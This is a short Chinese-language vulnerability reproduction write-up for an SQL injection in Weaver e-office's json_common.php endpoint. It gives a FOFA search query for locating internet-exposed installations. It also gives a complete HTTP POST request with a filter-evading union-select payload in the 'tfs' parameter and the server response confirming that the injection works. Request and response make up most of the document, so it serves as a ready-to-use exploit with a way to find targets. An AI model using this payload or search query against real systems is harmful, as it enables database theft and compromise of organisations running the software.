<a name="e6Em4"></a>
# 一、漏洞描述
```java
作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，其中泛微e-office为企业办公提供丰富应用，覆盖常见协作场景，开箱即用。满足人事、行政、财务、销售、运营、市场等不同部门协作需求，帮助组织高效人事管理。系统 json_common.php 文件存在SQL注入漏洞，容易导致数据泄露以及被远控。
```
<a name="YpI0q"></a>
# 一、fofa搜索语法
```java
app="泛微-EOffice"
```
<a name="TNcUl"></a>
# 二、漏洞复现
```java
POST /building/json_common.php HTTP/1.1
Host: 192.168.86.128:8097
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Length: 87
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333
```
响应数据包如下
```java
HTTP/1.1 200 OK
Connection: close
Content-Length: 36
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Nov 2023 09:21:14 GMT
Server: Apache/2.0.47 (Win32) PHP/5.2.5
Set-Cookie: LOGIN_LANG=cn; expires=Mon, 10-Aug-2026 09:21:14 GMT
X-Powered-By: PHP/5.2.5

["6cfe798ba8e5b85feb50164c59f4bec9"]
```
证明存在漏洞


